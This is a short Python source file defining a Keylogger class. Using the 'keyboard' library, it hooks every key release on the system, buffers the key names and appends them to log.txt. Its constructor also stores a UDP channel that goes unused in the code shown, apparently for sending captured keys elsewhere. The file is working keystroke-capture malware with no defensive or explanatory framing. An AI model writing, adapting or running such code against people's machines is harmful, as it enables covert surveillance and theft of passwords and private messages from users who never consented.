import keyboard


"""
Class designed to put every keyboard ouptuts in a file.
"""
class Keylogger:


    """
    Initializes the buffer.
    """
    def __init__(self, udpChannel):

        self.buffer     = ""
        self.udpChannel = udpChannel


    """
    Main loop waiting for keyboard events.
    """
    def run(self):

        keyboard.on_release(callback=self.onKeyPressed)
        keyboard.wait()
    

    """
    Callback function to record keyboard events and save the resulting buffer into a file.
    """
    def onKeyPressed(self, event):

        self.buffer += "{} ".format(event.name)

        if len(self.buffer) >= 20:

            with open("log.txt", "a") as logfile:

                logfile.write(self.buffer)
                self.buffer = ""